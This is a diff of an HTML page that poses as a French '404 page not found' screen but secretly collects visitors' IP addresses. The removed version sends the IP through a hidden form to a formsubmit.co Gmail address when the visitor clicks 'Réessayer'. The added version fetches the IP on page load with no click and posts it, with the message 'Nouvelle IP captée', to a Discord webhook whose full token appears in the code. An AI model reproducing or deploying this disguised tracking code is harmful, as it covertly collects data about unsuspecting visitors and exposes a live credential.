@@ -6,67 +6,49 @@
   <style>
     body {
       background-color: #121212;
-      color: #ffffff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
       display: flex;
       flex-direction: column;
       justify-content: center;
-      align-items: center;
       height: 100vh;
       margin: 0;
-      text-align: center;
     }
-    h1 {
-      font-size: 10rem;
-      margin: 0;
-    }
-    p {
-      font-size: 1.5rem;
-      margin: 10px 0 20px;
-    }
+    h1 { font-size: 6rem; }
+    p { font-size: 1.5rem; }
     button {
-      text-decoration: none;
-      color: #00bcd4;
-      background-color: #1e1e1e;
+      margin-top: 20px;
       padding: 10px 20px;
-      border-radius: 8px;
+      background: #00bcd4;
       border: none;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    button:hover {
-      background-color: #00bcd4;
       color: #121212;
-    }
-    #ip-form {
-      display: none;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <h1>404</h1>
-  <p>Oups... La page que tu cherches n'existe pas.</p>
-  <button onclick="reenvoi()">Réessayer</button>
-
-  <!-- Formulaire planqué -->
-  <form id="ip-form" action="https://formsubmit.co/blackeige2@gmail.com" method="POST">
-    <input type="hidden" name="IP" id="ip-input">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="about:blank">
-    <input type="hidden" name="_template" value="table">
-  </form>
+  <p>Oups... Page introuvable</p>
+  <button onclick="window.location.reload()">Réessayer</button>
 
   <script>
-    function reenvoi() {
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-          document.getElementById('ip-input').value = data.ip;
-          setTimeout(() => {
-            document.getElementById('ip-form').submit(); // FORMULAIRE AVEC POST
-          }, 300);
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const webhook = "https://discord.com/api/webhooks/1361707861486600262/pkrM_Hf_AXpiRLh8iUItwQaZ5ehWtPCrQ-ObypKkzIjR6AFK6yXS_pM8xA64CgsUE4QP";
+
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `Nouvelle IP captée : ${ip}`
+          })
         });
-    }
+      });
   </script>
 </body>
 </html>
